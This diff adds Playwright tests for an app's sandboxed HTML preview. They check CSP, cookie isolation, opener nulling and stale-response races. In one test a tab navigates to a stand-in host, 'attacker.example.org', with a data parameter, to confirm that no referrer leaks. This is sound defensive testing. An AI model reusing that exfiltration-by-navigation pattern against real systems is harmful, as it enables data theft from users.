@@ -2,6 +2,7 @@
 import { readFileSync } from 'node:fs'
 import { test, expect, type Page } from '@playwright/test'
 import { fixtures, mockWork } from './work-fixtures'
+import { controlStability } from './control-stability'
 
 // Exercise the exact shipped CSP in a real isolated browser. Go integration
 // tests cover the capability handler, session recheck and tenant/project RLS.
@@ -147,3 +148,126 @@ for (const width of [1440, 1024, 390]) for (const dark of [false, true]) {
     if (width === 390 && !dark) await page.screenshot({ path: testInfo.outputPath('html-preview-phone.png') })
   })
 }
+
+test('P08: separate-origin preview enforces CSP in the viewer and a detached tab', async ({ page, context }) => {
+  await context.addCookies([{ name: 'app-fixture', value: 'private', url: 'http://127.0.0.1' }])
+  const { viewer, calls, attempts } = await setup(page)
+  const iframe = viewer.locator('iframe.html-preview')
+  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
+  await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer')
+  const frame = page.frameLocator('iframe.html-preview')
+  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
+  expect(JSON.parse(await frame.locator('body').getAttribute('data-result') ?? '{}')).toEqual({
+    parent: true, cookie: true, storage: true, worker: true, serviceWorker: true, top: true, popup: true, connections: true,
+  })
+  expect(attempts).toEqual([])
+  expect(await page.locator('body').getAttribute('data-compromised')).toBeNull()
+  const close = viewer.getByRole('button', { name: 'Close viewer' })
+  const guard = await controlStability(page, { close, download: viewer.getByRole('link', { name: 'Download fragment.html' }) })
+  await guard.check(async () => {
+    await frame.getByRole('button', { name: 'Interact' }).click()
+    await expect(frame.getByRole('button', { name: 'Working' })).toBeVisible()
+  })
+  guard.done()
+  const downloads: string[] = []
+  page.on('download', download => downloads.push(download.suggestedFilename()))
+  await frame.getByRole('link', { name: 'Download attack' }).click()
+  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
+  expect(downloads).toEqual([])
+  expect(calls.filter(call => call.method !== 'GET' && call.path !== '/api/preferences/releases')).toEqual([])
+
+  const link = viewer.getByRole('link', { name: 'Open preview in new tab' })
+  await expect(link).toHaveAttribute('rel', 'noopener noreferrer')
+  const opened = context.waitForEvent('page')
+  await link.click()
+  const tab = await opened
+  await expect(tab.locator('body')).toHaveAttribute('data-ready', 'yes')
+  const result = JSON.parse(await tab.locator('body').getAttribute('data-result') ?? '{}')
+  expect(result).toMatchObject({ cookie: true, storage: true, worker: true, serviceWorker: true, popup: true, connections: true })
+  expect(await tab.evaluate(() => window.opener === null)).toBe(true)
+  expect(attempts).toEqual([])
+  // A direct tab can navigate itself. Preserve the explicit residual and the
+  // no-referrer assertion rather than promising that CSP prevents navigation.
+  let referrer: string | undefined
+  await tab.route('https://attacker.example.org/residual?data=synthetic', route => {
+    referrer = route.request().headers().referer
+    return route.fulfill({ body: 'Residual navigation observed', contentType: 'text/plain' })
+  })
+  await tab.evaluate(() => { location.href = 'https://attacker.example.org/residual?data=synthetic' })
+  await expect(tab).toHaveURL('https://attacker.example.org/residual?data=synthetic')
+  expect(referrer).toBeUndefined()
+  await tab.close()
+  await close.click()
+  await expect(iframe).toHaveCount(0)
+})
+
+test('P08: unavailable, expired and departed previews keep download and discard late grants', async ({ page }) => {
+  const now = Date.now()
+  await page.clock.install({ time: now })
+  const { viewer } = await setup(page, { available: false, body: '<html><button>Local</button></html>' })
+  const fallback = async (message: RegExp) => {
+    await expect(viewer.locator('iframe')).toHaveCount(0)
+    await expect(viewer.getByRole('status')).toContainText(message)
+    await expect(viewer.getByRole('link', { name: 'Download', exact: true })).toHaveAttribute('href', '/api/attachments/att-1/content?variant=original')
+  }
+  await fallback(/original can still be downloaded/)
+  let url = `https://127.0.0.1/preview/${'A'.repeat(43)}`
+  await page.route('**/api/attachments/att-1/preview', route => route.fulfill({ json: { available: true, url, expires_at: new Date(now + 60_000).toISOString() } }))
+  await viewer.getByRole('button', { name: 'Reload preview' }).click()
+  await fallback(/unavailable/)
+  url = previewURL
+  await viewer.getByRole('button', { name: 'Reload preview' }).click()
+  await expect(viewer.locator('iframe')).toHaveCount(1)
+  await expect(page.frameLocator('iframe.html-preview').getByRole('button', { name: 'Local', exact: true })).toBeVisible()
+  await page.clock.fastForward(60_001)
+  await fallback(/expired/)
+
+  // Hold a fully received response while its JSON is delivered. Aborting the
+  // network cannot hide a missing selection-generation check in this race.
+  await page.evaluate(() => {
+    type Hold = Window & { previewParsed: boolean; previewReturned: boolean; releasePreview: () => void }
+    const state = window as Hold, fetch = window.fetch
+    let held = false
+    state.previewParsed = false; state.previewReturned = false
+    window.fetch = async (...args) => {
+      const response = await fetch(...args)
+      if (new URL(response.url).pathname === '/api/attachments/att-1/preview' && !held) {
+        held = true
+        const json = response.json.bind(response)
+        response.json = async () => {
+          const value = await json()
+          const gate = new Promise<void>(resolve => { state.releasePreview = resolve })
+          state.previewParsed = true
+          await gate
+          state.previewReturned = true
+          return value
+        }
+      }
+      return response
+    }
+  })
+  let releaseFresh!: () => void, enteredFresh!: () => void, requests = 0
+  const freshHeld = new Promise<void>(resolve => { releaseFresh = resolve })
+  const freshStarted = new Promise<void>(resolve => { enteredFresh = resolve })
+  await page.route('**/api/attachments/att-1/preview', async route => {
+    if (++requests === 1) return route.fulfill({ json: { available: true, url: previewURL, expires_at: new Date(now + 120_000).toISOString() } })
+    enteredFresh(); await freshHeld
+    await route.fulfill({ json: { available: false } })
+  })
+  await viewer.getByRole('button', { name: 'Reload preview' }).click()
+  await expect.poll(() => page.evaluate(() => (window as Window & { previewParsed: boolean }).previewParsed)).toBe(true)
+  await viewer.getByRole('button', { name: 'Next attachment' }).click()
+  await expect(viewer.getByRole('heading', { name: 'After: compact list' })).toBeVisible()
+  await viewer.getByRole('button', { name: 'Previous attachment' }).click()
+  await freshStarted
+  await page.evaluate(async () => {
+    const state = window as Window & { releasePreview: () => void }
+    state.releasePreview()
+    await new Promise<void>(resolve => requestAnimationFrame(() => resolve()))
+  })
+  await expect.poll(() => page.evaluate(() => (window as Window & { previewReturned: boolean }).previewReturned)).toBe(true)
+  await expect(viewer.getByRole('status')).toContainText('Opening HTML preview')
+  await expect(viewer.locator('iframe')).toHaveCount(0)
+  releaseFresh()
+  await fallback(/unavailable/)
+})
